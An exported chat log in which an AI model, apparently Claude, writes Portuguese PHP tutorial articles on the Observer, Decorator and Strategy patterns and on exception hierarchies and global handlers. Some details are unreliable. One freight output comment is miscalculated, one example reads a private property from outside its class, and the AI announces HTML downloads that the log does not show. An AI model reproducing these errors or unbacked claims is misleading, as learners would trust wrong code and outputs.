// 📦 Estoque reservado para o pedido #42
// 🗒️  [MeuApp\Eventos\PedidoCriado] registrado em 14:32:01
```

O sistema de `Event::dispatch()` do Laravel é exatamente este padrão. O `EventServiceProvider.php` mapeia eventos a listeners — equivalente ao nosso `$dispatcher->listen()`. O Laravel também suporta listeners em fila (`implements ShouldQueue`), que processam o evento de forma assíncrona, sem bloquear a resposta HTTP.

---

## Decorator — adicionando comportamento sem herança

O Decorator envolve um objeto existente adicionando comportamentos antes ou depois das chamadas originais, sem modificar a classe base e sem usar herança. A chave do padrão está em uma condição fundamental: o decorator **implementa a mesma interface que o objeto que envolve** — o código cliente não percebe a diferença entre o objeto original e o decorado.

O caso mais concreto em PHP é o pipeline de middlewares HTTP: cada middleware envolve o próximo, adicionando autenticação, logging, cache ou compressão antes de passar a requisição adiante. Podem ser empilhados em qualquer ordem e combinados livremente. Com herança, adicionar cache *e* logging exigiria uma subclasse `CachedLoggingRepository`. Com Decorator, você compõe livremente — e adicionar um terceiro comportamento não exige alterar nenhuma classe existente.

```php
<?php
declare(strict_types=1);

namespace MeuApp\Repositories;

// Interface compartilhada — o decorator e o objeto original
// implementam a mesma interface, tornando-os intercambiáveis para o cliente
interface ProdutoRepositoryInterface
{
    public function buscarTodos(): array;
    public function buscarPorId(int $id): ?array;
}

// Implementação concreta — a "folha" da cadeia, faz o trabalho real
class ProdutoRepository implements ProdutoRepositoryInterface
{
    public function buscarTodos(): array
    {
        echo "🗄️  [DB] SELECT * FROM produtos\n";
        return [
            ['id' => 1, 'nome' => 'Teclado',  'preco' => 350.0],
            ['id' => 2, 'nome' => 'Mouse',    'preco' => 180.0],
            ['id' => 3, 'nome' => 'Monitor',  'preco' => 1200.0],
        ];
    }

    public function buscarPorId(int $id): ?array
    {
        echo "🗄️  [DB] SELECT * FROM produtos WHERE id = {$id}\n";
        return ['id' => $id, 'nome' => 'Produto', 'preco' => 100.0];
    }
}

// Decorator base abstrato — guarda a referência ao objeto envolvido
// Subclasses herdam a delegação padrão e só sobrescrevem o que decoram
abstract class ProdutoRepositoryDecorator implements ProdutoRepositoryInterface
{
    public function __construct(
        protected readonly ProdutoRepositoryInterface $inner,
    ) {}

    // Delegação padrão — repassa para o próximo na cadeia sem alterar nada
    public function buscarTodos(): array    { return $this->inner->buscarTodos(); }
    public function buscarPorId(int $id): ?array { return $this->inner->buscarPorId($id); }
}

// Decorator 1 — Cache em memória
class CacheProdutoRepository extends ProdutoRepositoryDecorator
{
    private array $cache = [];

    public function buscarTodos(): array
    {
        if (!isset($this->cache['todos'])) {
            echo "💾 [Cache MISS] buscando no banco...\n";
            // Delega para o próximo na cadeia (pode ser o DB ou outro decorator)
            $this->cache['todos'] = $this->inner->buscarTodos();
        } else {
            echo "⚡ [Cache HIT] retornando do cache\n";
        }
        return $this->cache['todos'];
    }

    public function buscarPorId(int $id): ?array
    {
        if (!isset($this->cache["id_{$id}"])) {
            $this->cache["id_{$id}"] = $this->inner->buscarPorId($id);
        }
        return $this->cache["id_{$id}"];
    }
}

// Decorator 2 — Logging de tempo de execução
class LoggingProdutoRepository extends ProdutoRepositoryDecorator
{
    public function buscarTodos(): array
    {
        $inicio    = hrtime(true);
        $resultado = $this->inner->buscarTodos();
        $ms        = round((hrtime(true) - $inicio) / 1e6, 2);

        echo "📋 [Log] buscarTodos: {$ms}ms — " . count($resultado) . " registros\n";
        return $resultado;
    }
}

// Composição — empilha decorators do mais externo para o mais interno
// A ordem importa: Log → Cache → DB
$repo = new LoggingProdutoRepository(
    new CacheProdutoRepository(
        new ProdutoRepository()        // objeto base — faz a query real
    )
);

// Primeira chamada: Log mede tempo → Cache MISS → DB executa
$produtos = $repo->buscarTodos();
// 📋 [Log] buscarTodos: X ms
// 💾 [Cache MISS] buscando no banco...
// 🗄️  [DB] SELECT * FROM produtos

// Segunda chamada: Log mede tempo → Cache HIT → sem consulta ao banco
$produtos = $repo->buscarTodos();
// 📋 [Log] buscarTodos: X ms
// ⚡ [Cache HIT] retornando do cache
```

Este é o Open/Closed Principle em ação: o `ProdutoRepository` original nunca foi modificado. Cache e logging foram adicionados por composição. Amanhã, um `CompressionDecorator` pode ser empilhado sem tocar em nenhuma das classes existentes.

---

## Strategy — algoritmos intercambiáveis

O Strategy encapsula uma família de algoritmos em classes separadas, tornando-os intercambiáveis. O objeto que usa o algoritmo (o *Context*) recebe uma implementação de `StrategyInterface` — geralmente via construtor ou método setter — e a chama sem saber qual algoritmo concreto está executando. Isso elimina condicionais `switch/if` baseados em "tipo de algoritmo" espalhados pelo código.

O problema clássico que o Strategy resolve: imagine um sistema de e-commerce onde o cálculo de frete muda conforme o método escolhido pelo cliente. Sem Strategy, o código de `Pedido` teria um `switch ($tipoFrete)` com cada algoritmo embutido. Adicionar um novo tipo de frete exigiria modificar `Pedido`. Com Strategy, `Pedido` depende de uma interface — e cada algoritmo vive na sua própria classe.

```php
<?php
declare(strict_types=1);

namespace MeuApp\Frete;

// Interface Strategy — define o contrato comum dos algoritmos
interface CalculadorFreteInterface
{
    public function calcular(float $peso, float $distanciaKm): float;
    public function prazoEntregaDias(): int;
    public function nome(): string;
}

// Estratégias concretas — cada uma encapsula seu próprio algoritmo de cálculo
final class FreteCorreios implements CalculadorFreteInterface
{
    public function calcular(float $peso, float $dist): float
    {
        // Fórmula simplificada: taxa base + peso + distância
        return round(15.0 + ($peso * 2.5) + ($dist * 0.05), 2);
    }
    public function prazoEntregaDias(): int { return 7; }
    public function nome(): string          { return 'Correios PAC'; }
}

final class FreteExpress implements CalculadorFreteInterface
{
    public function calcular(float $peso, float $dist): float
    {
        // Express tem tarifa mínima e é mais caro por kg e por km
        return round(max(50.0, 30.0 + ($peso * 5.0) + ($dist * 0.12)), 2);
    }
    public function prazoEntregaDias(): int { return 1; }
    public function nome(): string          { return 'Express 24h'; }
}

final class FreteGratis implements CalculadorFreteInterface
{
    public function calcular(float $peso, float $dist): float { return 0.0; }
    public function prazoEntregaDias(): int { return 10; }
    public function nome(): string          { return 'Frete Grátis'; }
}

// Context — usa a estratégia injetada sem saber qual algoritmo é
class Pedido
{
    public function __construct(
        private readonly float  $totalItens,
        private readonly float  $pesoKg,
        private readonly float  $distanciaKm,
        // A estratégia é injetada — Pedido não conhece nenhuma classe concreta
        private CalculadorFreteInterface $calculadorFrete,
    ) {}

    // Permite trocar a estratégia em tempo de execução
    public function setFrete(CalculadorFreteInterface $calculador): void
    {
        $this->calculadorFrete = $calculador;
    }

    public function valorFrete(): float
    {
        return $this->calculadorFrete->calcular($this->pesoKg, $this->distanciaKm);
    }

    public function resumo(): string
    {
        $frete = $this->valorFrete();
        return sprintf(
            "%s | Frete: R$ %.2f | Prazo: %d dia(s) | Total: R$ %.2f",
            $this->calculadorFrete->nome(),
            $frete,
            $this->calculadorFrete->prazoEntregaDias(),
            $this->totalItens + $frete
        );
    }
}

$pedido = new Pedido(
    totalItens:      500.0,
    pesoKg:          2.5,
    distanciaKm:     400.0,
    calculadorFrete: new FreteCorreios(),
);

echo $pedido->resumo() . "\n";
// Correios PAC | Frete: R$ 41.25 | Prazo: 7 dia(s) | Total: R$ 541.25

// Troca para Express sem modificar Pedido
$pedido->setFrete(new FreteExpress());
echo $pedido->resumo() . "\n";
// Express 24h | Frete: R$ 90.80 | Prazo: 1 dia(s) | Total: R$ 590.80

// Compra acima de R$1000 ganha frete grátis — regra de negócio externa ao Pedido
if ($pedido->totalItens >= 1000.0) {
    $pedido->setFrete(new FreteGratis());
}
```

Para estratégias simples e de uso único, PHP permite passar uma `Closure` diretamente no lugar de um objeto com interface. Os drivers de fila (`sync`, `database`, `redis`), os guards de autenticação (`session`, `token`) e os drivers de cache do Laravel são todos Strategy — você troca uma linha no `.env` e o algoritmo inteiro muda sem modificar código de aplicação.

---

## Os três padrões juntos — sistema de pagamentos

Em projetos reais, esses padrões frequentemente colaboram. Um processador de pagamentos usa **Strategy** para o método de cobrança, **Decorator** para adicionar retry e logging às chamadas, e **Observer** para notificar o restante do sistema quando um pagamento é concluído:

```php
<?php
declare(strict_types=1);

// ── STRATEGY — define o algoritmo de cobrança ─────────────────────────
interface MetodoPagamento
{
    public function cobrar(float $valor): bool;
    public function nome(): string;
}

class PagamentoPix implements MetodoPagamento
{
    public function cobrar(float $valor): bool
    {
        echo "  ⚡ Pix: gerando QR Code para R$ {$valor}\n";
        return true;
    }
    public function nome(): string { return 'Pix'; }
}

class PagamentoCartao implements MetodoPagamento
{
    public function cobrar(float $valor): bool
    {
        echo "  💳 Cartão: autorizando R$ {$valor}\n";
        return true;
    }
    public function nome(): string { return 'Cartão'; }
}

// ── DECORATOR — adiciona retry sem modificar as classes de pagamento ───
class PagamentoComRetry implements MetodoPagamento
{
    public function __construct(
        private readonly MetodoPagamento $inner,
        private readonly int $tentativas = 3,
    ) {}

    public function cobrar(float $valor): bool
    {
        for ($i = 1; $i <= $this->tentativas; $i++) {
            echo "  🔄 Tentativa {$i}/{$this->tentativas}\n";
            if ($this->inner->cobrar($valor)) return true;
        }
        return false;
    }
    public function nome(): string { return $this->inner->nome() . ' (+retry)'; }
}

// ── OBSERVER — notifica o sistema após o pagamento ────────────────────
final class PagamentoProcessado
{
    public function __construct(
        public readonly string $metodo,
        public readonly float  $valor,
        public readonly bool   $sucesso,
    ) {}
}

// Context que usa Strategy e dispara Observer ao concluir
class Checkout
{
    private array $onPagamento = [];

    public function __construct(private MetodoPagamento $metodo) {}

    public function aoProcessar(\Closure $callback): void
    {
        $this->onPagamento[] = $callback;
    }

    public function pagar(float $valor): bool
    {
        echo "🛒 Processando R$ {$valor} via {$this->metodo->nome()}\n";
        $sucesso = $this->metodo->cobrar($valor);

        // Dispara o evento para todos os observers registrados
        $evento = new PagamentoProcessado($this->metodo->nome(), $valor, $sucesso);
        foreach ($this->onPagamento as $cb) $cb($evento);

        return $sucesso;
    }
}

// Composição final: Strategy dentro de Decorator, Context com Observer
$checkout = new Checkout(
    new PagamentoComRetry(new PagamentoPix(), 2)
);

$checkout->aoProcessar(fn(PagamentoProcessado $e) =>
    print("  📧 Recibo de R$ {$e->valor} enviado ao cliente\n")
);
$checkout->aoProcessar(fn(PagamentoProcessado $e) =>
    print("  📊 Transação registrada no financeiro\n")
);

$checkout->pagar(350.0);
// 🛒 Processando R$ 350 via Pix (+retry)
//   🔄 Tentativa 1/2
//   ⚡ Pix: gerando QR Code para R$ 350
//   📧 Recibo de R$ 350 enviado ao cliente
//   📊 Transação registrada no financeiro
```

---

## Resumo do artigo

| Padrão | Categoria | Problema resolvido | Onde aparece em frameworks |
|---|---|---|---|
| Observer | Comportamental | Desacoplar quem dispara de quem reage a eventos | `Event::dispatch()` no Laravel, EventDispatcher do Symfony |
| Decorator | Estrutural | Adicionar comportamentos a objetos sem herança | Middlewares HTTP, cache layers, stream wrappers |
| Strategy | Comportamental | Algoritmos intercambiáveis com a mesma interface | Auth guards, drivers de fila, drivers de cache, mailers |

---

## Exercício da semana

1. Implemente um `EventDispatcher` com suporte a **prioridade** nos listeners — listeners de prioridade mais alta são notificados primeiro. Adicione também `removeListener(string $evento, ListenerInterface $listener): void`.

2. Crie uma cadeia de Decorators para `TextoProcessadorInterface` com método `processar(string $texto): string`. Implemente a classe base e três decorators: `UpperCaseDecorator`, `TrimDecorator` e `SlugDecorator` (espaços viram hífens, remove acentos e caracteres especiais). Teste-os empilhados em ordens diferentes e observe como a ordem altera o resultado.

3. Implemente a Strategy de autenticação: interface `AuthStrategyInterface` com `autenticar(string $credencial): bool` e `tipo(): string`. Implemente `AuthPassword`, `AuthToken` e `AuthApiKey`. Um `AuthManager` recebe a estratégia via construtor.

4. Combine os três padrões: um `PaginaService` busca conteúdo do banco, decorado com cache e logging. Quando o conteúdo é acessado pela primeira vez, dispara um evento `ConteudoAcessado`. Dois listeners registram o acesso e enviam dados de analytics.

5. **Desafio:** implemente um mini-pipeline de transformação. Interface `TransformacaoInterface` com `transformar(array $dados): array` como Strategy. Uma classe `Pipeline` recebe um array de transformações e executa em sequência. Cada transformação é decorada com logging antes e depois. Quando o pipeline termina, dispara `TransformacaoConcluida` via Observer.

---

## Referências

- GAMMA et al. *Design Patterns: Elements of Reusable Object-Oriented Software*. Addison-Wesley, 1994. https://www.oreilly.com/library/view/design-patterns-elements/0201633612/
- Refactoring Guru — Observer (pt-BR): https://refactoring.guru/pt-br/design-patterns/observer
- Refactoring Guru — Decorator (pt-BR): https://refactoring.guru/pt-br/design-patterns/decorator
- Refactoring Guru — Strategy (pt-BR): https://refactoring.guru/pt-br/design-patterns/strategy
- Laravel Events — Documentação oficial: https://laravel.com/docs/events
- Symfony HttpKernel — Middleware como Decorator: https://symfony.com/doc/current/http_kernel.html
- Design Patterns PHP (pt-BR): https://designpatternsphp.readthedocs.io/pt_BR/latest/

---

Texto do Artigo 15 completo. Gerando o HTML para download.

Artigo 15 completo no formato correto — texto primeiro, HTML para download. 680 linhas, fechado corretamente.

Agora o Artigo 16 — **Exceções Avançadas**. Seguindo o mesmo fluxo: texto completo primeiro.

---

# Artigo 16 — Exceções Avançadas

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 16 · Módulo 3: Orientação a Objetos

---

## Introdução

Tratamento de erros é onde código bom se separa de código profissional. O básico — `try/catch/finally` — você já domina. Neste artigo avançamos para o design de hierarquias de exceções, o contrato `Throwable`, encadeamento de causa com `$previous`, handlers globais com `set_exception_handler()`, e os antipadrões que transformam exceções de aliadas em pesadelo de manutenção.

Esses conceitos aparecem diretamente em frameworks PHP: o Laravel usa uma hierarquia própria (`HttpException`, `ModelNotFoundException`, `ValidationException`), o Symfony tem `HttpExceptionInterface` que o kernel reconhece automaticamente, e o tratamento correto de exceções determina se sua API retorna uma mensagem útil ou expõe um stack trace inteiro para o cliente.

---

## A hierarquia Throwable do PHP

No PHP 7+, toda classe lançável implementa a interface `Throwable`. Ela tem dois ramos: `Error` (erros internos do PHP — `TypeError`, `ParseError`, `ArithmeticError`) e `Exception` (exceções de aplicação). A distinção é importante: `Error` geralmente indica um bug no código, enquanto `Exception` representa condições previstas e recuperáveis.

```
Throwable  ← interface — catch(Throwable) captura QUALQUER coisa
├── Error  ← erros do próprio PHP
│   ├── TypeError          tipo inválido em função tipada
│   ├── ParseError         erro de sintaxe em eval()
│   ├── ArithmeticError
│   │   └── DivisionByZeroError
│   └── AssertionError
└── Exception  ← exceções de aplicação — estenda desta
    ├── RuntimeException   erros detectáveis só em execução
    │   ├── OverflowException
    │   ├── UnderflowException
    │   └── UnexpectedValueException
    ├── LogicException     violações de pré-condições
    │   ├── InvalidArgumentException
    │   ├── OutOfRangeException
    │   ├── LengthException
    │   └── BadMethodCallException
    └── suas exceções de domínio  ← define aqui
```

```php
<?php
declare(strict_types=1);

// Capturar Exception NÃO captura Error — TypeError é um Error
function somaEstrita(int $a, int $b): int { return $a + $b; }

try {
    somaEstrita("dois", 3);  // TypeError — string onde int é esperado
} catch (Exception $e) {
    // NÃO captura — TypeError é Error, não Exception
    echo "Capturado como Exception\n";
} catch (TypeError $e) {
    // Captura corretamente
    echo "TypeError: " . $e->getMessage() . "\n";
}

// Throwable captura TUDO — use apenas em handlers de último recurso
try {
    somaEstrita("dois", 3);
} catch (\Throwable $t) {
    // Captura Error E Exception — útil apenas nas bordas do sistema
    echo get_class($t) . ": " . $t->getMessage() . "\n";
    // TypeError: somaEstrita(): Argument #1 must be of type int, string given
}

// Múltiplos tipos num mesmo catch — PHP 8+
try {
    // código que pode lançar diferentes tipos
} catch (InvalidArgumentException | OverflowException $e) {
    // trata os dois da mesma forma
    echo "Erro de validação: " . $e->getMessage();
}
```

---

## Desenhando sua hierarquia de exceções

Uma hierarquia bem projetada permite que o código cliente capture exceções no nível de granularidade certo. A regra de ouro: **crie uma exceção base por módulo/domínio e derive exceções específicas dela**. Assim o chamador pode capturar `PedidoException` para tratar qualquer erro de pedido, ou `PedidoNaoEncontradoException` para um caso específico.

```php
<?php
declare(strict_types=1);

namespace MeuApp\Exceptions;

// Raiz da hierarquia — toda exceção da aplicação estende esta
abstract class AppException extends \RuntimeException {}

// ── HTTP / API ──────────────────────────────────────────────────────────
class HttpException extends AppException
{
    public function __construct(
        public readonly int $statusHttp,
        string $mensagem,
        \Throwable $anterior = null,
    ) {
        parent::__construct($mensagem, $statusHttp, $anterior);
    }
}

class NaoEncontradoException extends HttpException
{
    public function __construct(string $recurso, int|string $id)
    {
        parent::__construct(404, "{$recurso} com ID '{$id}' não encontrado.");
    }
}

class NaoAutorizadoException extends HttpException
{
    public function __construct(string $acao = "acessar este recurso")
    {
        parent::__construct(403, "Você não tem permissão para {$acao}.");
    }
}

class NaoAutenticadoException extends HttpException
{
    public function __construct()
    {
        parent::__construct(401, "Autenticação necessária.");
    }
}

// ── VALIDAÇÃO ───────────────────────────────────────────────────────────
class ValidacaoException extends AppException
{
    public function __construct(
        /** @var array<string, string[]> */
        public readonly array $erros,
    ) {
        parent::__construct("Erro de validação: " . implode("; ", array_merge(...$erros)));
    }

    public function errosPorCampo(string $campo): array
    {
        return $this->erros[$campo] ?? [];
    }
}

// ── DOMÍNIO: PEDIDOS ────────────────────────────────────────────────────
abstract class PedidoException extends AppException {}

class PedidoNaoEncontradoException extends PedidoException
{
    public function __construct(
        public readonly int $pedidoId,
        \Throwable $anterior = null,
    ) {
        parent::__construct("Pedido #{$pedidoId} não encontrado.", 404, $anterior);
    }
}

class EstoqueInsuficienteException extends PedidoException
{
    public function __construct(
        public readonly string $produto,
        public readonly int    $solicitado,
        public readonly int    $disponivel,
    ) {
        parent::__construct(
            "Estoque insuficiente para '{$produto}': solicitado {$solicitado}, disponível {$disponivel}."
        );
    }
}

// Granularidade de captura — do mais específico ao mais genérico
try {
    throw new PedidoNaoEncontradoException(999);
} catch (PedidoNaoEncontradoException $e) {
    // Mais específico — trata só "pedido não encontrado"
    echo "Pedido ID: " . $e->pedidoId . "\n";
} catch (PedidoException $e) {
    // Médio — trata qualquer erro de pedido
} catch (AppException $e) {
    // Amplo — trata qualquer erro da aplicação
}
```

---

## Encadeamento de exceções — preservando a causa

Quando você captura uma exceção de baixo nível (erro de PDO, falha de rede) e relança uma exceção de alto nível mais significativa para o domínio, é fundamental preservar a exceção original como **causa** usando o parâmetro `$previous`. Isso mantém o stack trace completo para depuração sem vazar detalhes de implementação para o código cliente.

```php
<?php
declare(strict_types=1);

class PedidoRepository
{
    public function buscarPorId(int $id): array
    {
        try {
            // Simula uma falha de banco de dados
            throw new \PDOException("SQLSTATE[42S02]: Table 'pedidos' doesn't exist");

        } catch (\PDOException $pdoException) {
            // Traduz exceção de infraestrutura → exceção de domínio
            // $pdoException fica como $previous — preserva o contexto completo
            throw new PedidoNaoEncontradoException($id, $pdoException);
        }
    }
}

try {
    (new PedidoRepository())->buscarPorId(42);
} catch (PedidoNaoEncontradoException $e) {
    echo "Mensagem: "  . $e->getMessage()  . "\n";
    echo "Código: "    . $e->getCode()     . "\n";
    echo "Pedido ID: " . $e->pedidoId      . "\n";

    // getPrevious() retorna a PDOException original
    // Deve ser logada — nunca exposta ao cliente
    $causa = $e->getPrevious();
    if ($causa) {
        echo "Causa (para log): " . $causa->getMessage() . "\n";
    }
}
// Mensagem: Pedido #42 não encontrado.
// Código: 404
// Pedido ID: 42
// Causa (para log): SQLSTATE[42S02]: Table 'pedidos' doesn't exist
```

A regra é clara: **o cliente da API vê a mensagem de domínio. O log registra a causa técnica**. Nunca inverta isso.

---

## Finally — garantindo limpeza de recursos

O bloco `finally` executa **sempre**, independente de exceção ser lançada, capturada ou não capturada — inclusive quando há `return` dentro do `try`. É o lugar correto para liberar recursos como conexões, arquivos e locks.

```php
<?php
declare(strict_types=1);

function processarArquivo(string $caminho): array
{
    $handle = null;

    try {
        $handle = fopen($caminho, 'r');

        if ($handle === false) {
            throw new \RuntimeException("Não foi possível abrir: {$caminho}");
        }

        $linhas = [];
        while (($linha = fgets($handle)) !== false) {
            $linhas[] = trim($linha);
        }
        return $linhas;

    } catch (\RuntimeException $e) {
        echo "Erro: " . $e->getMessage() . "\n";
        return [];

    } finally {
        // SEMPRE executa — com exceção, sem exceção, com return no try/catch
        // Garante que o arquivo seja fechado independente do que aconteceu
        if (is_resource($handle)) {
            fclose($handle);
            echo "📁 Arquivo fechado.\n";
        }
    }
}

// Demonstração: o finally executa mesmo quando há return no try
function demoFinally(): string
{
    try {
        return "valor do try";  // o return é preparado...
    } finally {
        echo "finally executou antes do return ser entregue!\n";
        // Se houver return no finally, ele SOBRESCREVE o do try
    }
}

echo demoFinally();
// finally executou antes do return ser entregue!
// valor do try
```

---

## Handlers globais — a última linha de defesa

Qualquer exceção não capturada em nenhum `try/catch` sobe até o handler global registrado com `set_exception_handler()`. Esse handler formata a resposta de erro, registra no log, e decide o que mostrar ao usuário versus o que esconder. Em produção, nunca deve expor stack traces — em desenvolvimento, deve mostrar tudo.

```php
<?php
declare(strict_types=1);

use MeuApp\Exceptions\HttpException;
use MeuApp\Exceptions\ValidacaoException;
use MeuApp\Exceptions\AppException;

$ambiente = getenv('APP_ENV') ?: 'production';

// Registra o handler global para exceções não capturadas
set_exception_handler(function (\Throwable $e) use ($ambiente): void {

    // 1. Sempre registra no log — independente do ambiente
    error_log(sprintf(
        "[%s] %s: %s em %s:%d\nStack trace:\n%s",
        date('Y-m-d H:i:s'),
        get_class($e),
        $e->getMessage(),
        $e->getFile(),
        $e->getLine(),
        $e->getTraceAsString()
    ));

    // 2. Determina o status HTTP e a mensagem baseados no tipo de exceção
    [$status, $corpo] = match (true) {
        $e instanceof ValidacaoException  => [422, ['erros'    => $e->erros]],
        $e instanceof HttpException       => [$e->statusHttp, ['mensagem' => $e->getMessage()]],
        $e instanceof AppException        => [500, ['mensagem' => $e->getMessage()]],
        // Exceções inesperadas — não vaza detalhes em produção
        default => [500, $ambiente === 'development'
            ? ['mensagem' => $e->getMessage(), 'classe' => get_class($e), 'trace' => $e->getTrace()]
            : ['mensagem' => 'Erro interno do servidor. Tente novamente em instantes.']
        ],
    };

    // 3. Envia a resposta HTTP adequada
    http_response_code($status);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['erro' => $corpo], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
});

// Converte erros PHP (notices, warnings) em exceções — garante tratamento uniforme
set_error_handler(function (int $errno, string $msg, string $file, int $line): bool {
    // Respeita o operador @ (supressão de erros)
    if (error_reporting() === 0) return false;

    throw new \ErrorException($msg, $errno, $errno, $file, $line);
});

// A partir daqui, qualquer exceção não tratada ativa o handler acima
// Exemplo: throw new NaoAutorizadoException() → resposta 403 JSON automática
```

---

## Boas práticas e antipadrões

**Nunca capture para silenciar.** Um `catch` vazio que engole a exceção sem log, sem retorno alternativo, sem nada — é o pior antipadrão possível. O erro desaparece, o sistema continua em estado inválido, e você não tem nenhuma pista do que aconteceu.

**Não capture o que não sabe tratar.** Se o código não sabe o que fazer com uma `PDOException`, não a capture ali — deixe subir para quem sabe. Capture somente no nível onde você tem contexto suficiente para tomar uma decisão significativa.

**Use exceções para condições excepcionais, não para fluxo normal.** `buscarPorId()` retornando `null` quando o registro não existe é fluxo normal — não é exceção. `buscarPorId()` lançando exceção quando o banco está inacessível é condição excepcional.

**Inclua contexto relevante na exceção.** A mensagem "ID inválido" é inútil. A mensagem "Produto com ID '999' não encontrado na tabela 'produtos'" é investigável. Use `readonly` properties para transportar dados estruturados junto com a exceção.

```php
<?php
declare(strict_types=1);

// ❌ Antipadrões comuns

// 1. Catch vazio — engole o erro sem rastro
try {
    $db->buscar(42);
} catch (\Exception $e) {
    // silêncio total — o sistema continua em estado desconhecido
}

// 2. Captura genérica desnecessária
try {
    $resultado = calcularDesconto($pedido);
} catch (\Exception $e) {
    // trata Exception genérica, mas só deveria tratar DescontoInvalidoException
    return 0.0;
}

// 3. Re-lançar perdendo a causa
try {
    $pdo->query($sql);
} catch (\PDOException $e) {
    // ❌ perde o stack trace original
    throw new \RuntimeException("Erro ao buscar dados");
    // ✅ correto: throw new \RuntimeException("Erro ao buscar dados", 0, $e);
}

// ✅ Padrões corretos

// 1. Log mínimo antes de deixar subir
try {
    $db->buscar(42);
} catch (\PDOException $e) {
    // Registra o contexto e re-lança como exceção de domínio
    throw new PedidoNaoEncontradoException(42, $e);
}

// 2. Finally para limpeza garantida
$conexao = null;
try {
    $conexao = abrirConexao();
    $conexao->executar($sql);
} finally {
    $conexao?->fechar();  // executa sempre, mesmo com exceção
}

// 3. Exceção com dados ricos
throw new EstoqueInsuficienteException(
    produto:    'Teclado Mecânico',
    solicitado: 5,
    disponivel: 2,
);
// getMessage() → "Estoque insuficiente para 'Teclado Mecânico': solicitado 5, disponível 2."
// $e->produto, $e->solicitado, $e->disponivel disponíveis para o handler
```

---

## Resumo do artigo

| Conceito | O que aprendemos |
|---|---|
| `Throwable` | Interface raiz — `Error` (bugs PHP) vs `Exception` (erros de aplicação) |
| `catch (A\|B $e)` | Múltiplos tipos num mesmo bloco — PHP 8+ |
| Hierarquia própria | Base por módulo + exceções específicas derivadas |
| `$previous` | Preserva a causa original ao traduzir exceções de infra para domínio |
| `getPrevious()` | Recupera a exceção que causou a atual — para log |
| `finally` | Executa sempre — local correto para limpeza de recursos |
| `set_exception_handler()` | Handler global para exceções não capturadas |
| `set_error_handler()` | Converte warnings/notices em `ErrorException` |
| Catch vazio | Antipadrão — nunca silenciar exceções sem log |

---

## Exercício da semana

1. Crie uma hierarquia de exceções para um sistema de pagamentos: `PagamentoException` (base), `CartaoRecusadoException` (com código de recusa e últimos 4 dígitos), `LimiteExcedidoException` (com limite disponível e valor solicitado), `FraudeDetectadaException` (com ID de transação). Cada exceção deve ter `readonly` properties com dados relevantes e mensagem descritiva.

2. Implemente um `PagamentoService` que ao processar um pagamento pode lançar qualquer das exceções acima. Num ponto externo, trate cada tipo de forma diferente: `CartaoRecusado` → solicitar novo cartão; `LimiteExcedido` → sugerir parcelas; `FraudeDetectada` → bloquear conta e notificar segurança.

3. Adicione encadeamento: quando um `PDOException` ocorre ao registrar o pagamento, envolva-o numa `PagamentoException` preservando a causa. Verifique com `getPrevious()` que o stack trace original está acessível.

4. Implemente um handler global com `set_exception_handler()` que: para `PagamentoException` retorna JSON com status 402 e detalhes; para `\Throwable` genérico retorna 500 em produção (sem detalhes) ou 500 com stack trace em desenvolvimento (baseado em `APP_ENV`).

5. **Desafio:** crie um `ExceptionHandler` orientado a objetos com método `register(): void` que registra o handler global, `render(\Throwable $e): array` que retorna o array de resposta, e `report(\Throwable $e): void` que registra no log. Use um array de renderers registráveis — `addRenderer(string $classe, \Closure $renderer): void` — para que cada tipo de exceção tenha seu próprio formato de resposta. Implemente renderers para `ValidacaoException`, `HttpException` e `\Throwable` genérico.

---

## Referências

- PHP Manual — Exceptions: https://www.php.net/manual/pt_BR/language.exceptions.php
- PHP Manual — set_exception_handler: https://www.php.net/manual/pt_BR/function.set-exception-handler.php
- PHP Manual — Predefined Exceptions: https://www.php.net/manual/pt_BR/spl.exceptions.php
- PHP Manual — Throwable: https://www.php.net/manual/pt_BR/class.throwable.php
- MARTIN, R.C. *Clean Code*, Cap. 7: Error Handling. https://www.oreilly.com/library/view/clean-code-a/9780136083238/
- Laravel Exception Handling — Documentação oficial: https://laravel.com/docs/errors
- PHP: The Right Way — Exceptions: https://phptherightway.com/#exceptions

---

Texto do Artigo 16 completo. Gerando o HTML para download.

---

# you asked

message time: 2026-03-07 00:46:01

Continue

---

# claude response

O arquivo 16 não existe ainda. Vou criá-lo completo de uma vez.

---

# you asked

message time: 2026-03-07 00:49:08

E o texto antes?

---

# claude response

Tem razão — fui direto para o HTML sem apresentar o texto do Artigo 16 primeiro. Vou seguir o fluxo correto.

---

# Artigo 16 — Exceções Avançadas

**Prof. Ricardo Matos · Mestre em Programação**
Série *Dominando o PHP em 1 Ano* · Semana 16 · Módulo 3: Orientação a Objetos

---

## Introdução

Tratamento de erros é onde código bom se separa de código profissional. O básico — `try/catch/finally` — você já domina. Neste artigo avançamos para o design de hierarquias de exceções, o contrato `Throwable`, encadeamento de causa com `$previous`, handlers globais com `set_exception_handler()`, e os antipadrões que transformam exceções de aliadas em pesadelo de manutenção.

Esses conceitos aparecem diretamente em frameworks PHP: o Laravel usa uma hierarquia própria (`HttpException`, `ModelNotFoundException`, `ValidationException`), o Symfony tem `HttpExceptionInterface` que o kernel reconhece automaticamente, e o tratamento correto de exceções determina se sua API retorna uma mensagem útil ou expõe um stack trace inteiro para o cliente.

---

## A hierarquia Throwable do PHP

No PHP 7+, toda classe lançável implementa a interface `Throwable`. Ela tem dois ramos: `Error` (erros internos do PHP — `TypeError`, `ParseError`, `ArithmeticError`) e `Exception` (exceções de aplicação). A distinção é importante: `Error` geralmente indica um bug no código, enquanto `Exception` representa condições previstas e recuperáveis.

```
Throwable  ← interface — catch(Throwable) captura qualquer coisa
├── Error  ← erros do próprio PHP
│   ├── TypeError          tipo inválido em função tipada
│   ├── ParseError         erro de sintaxe em eval()
│   ├── ArithmeticError
│   │   └── DivisionByZeroError
│   └── AssertionError
└── Exception  ← exceções de aplicação — estenda desta
    ├── RuntimeException   erros detectáveis só em execução
    │   ├── OverflowException
    │   ├── UnderflowException
    │   └── UnexpectedValueException
    ├── LogicException     violações de pré-condições
    │   ├── InvalidArgumentException
    │   ├── OutOfRangeException
    │   ├── LengthException
    │   └── BadMethodCallException
    └── suas exceções de domínio  ← define aqui
```

```php
<?php
declare(strict_types=1);

// Capturar Exception NÃO captura Error — TypeError é um Error
function somaEstrita(int $a, int $b): int { return $a + $b; }

try {
    somaEstrita("dois", 3);  // TypeError — string onde int é esperado
} catch (Exception $e) {
    // NÃO captura — TypeError é Error, não Exception
} catch (TypeError $e) {
    // Captura corretamente
